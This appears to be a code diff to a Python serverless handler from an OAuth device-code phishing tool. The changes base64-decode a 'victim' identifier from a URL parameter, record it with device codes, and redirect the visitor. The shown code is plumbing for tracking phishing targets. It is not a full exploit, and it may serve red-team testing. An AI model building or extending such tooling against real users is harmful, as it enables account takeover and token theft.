@@ -58,9 +58,12 @@ def save_to_db(url, deviceCode, oidc_application, victim=""):
 
     return data
 
-# implement some type of symetric algo
 def decode_victim_name(url_paramater):
-    return url_paramater
+    base64_message = str(url_paramater)
+    base64_bytes = base64_message.encode('ascii')
+    message_bytes = base64.b64decode(base64_bytes)
+    message = message_bytes.decode('ascii')
+    return message
 
 def main(event, context):
 
@@ -70,7 +73,7 @@ def main(event, context):
     victim = ""
 
     try:
-        victim = decode_victim_name(event['queryStringParameters']['v'])
+        victim = decode_victim_name(str(event['queryStringParameters']['v']))
     except Exception:
         pass
 
@@ -82,7 +85,6 @@ def main(event, context):
 
     response = {
         "statusCode": 301,
-        "body":str(decode_victim_name(victim)),
         "headers":{
             "Location": url
         }
